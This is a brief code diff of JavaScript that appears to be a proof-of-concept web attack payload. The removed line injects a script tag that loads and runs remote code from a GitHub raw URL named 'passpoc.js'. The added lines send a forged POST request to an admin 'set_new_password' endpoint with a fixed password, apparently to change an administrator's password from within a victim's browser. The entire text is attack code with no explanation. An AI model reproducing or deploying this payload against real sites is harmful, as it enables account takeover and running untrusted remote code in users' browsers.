@@ -1,1 +1,7 @@
-let s = document.createElement('script');s.src = 'https://raw.githubusercontent.com/nikalumoglich/passpoc/refs/heads/main/passpoc.js';document.body.appendChild(s);console.log('from external source')
+fetch("https://local.meetsoci.com/api/admin/0/set_new_password?request_token=", {
+  method: "POST",
+  headers: {
+    "Content-Type": "application/x-www-form-urlencoded"
+  },
+  body: "password=PasswordTest123!"
+}).then(a => {console.log('we got', a);} );
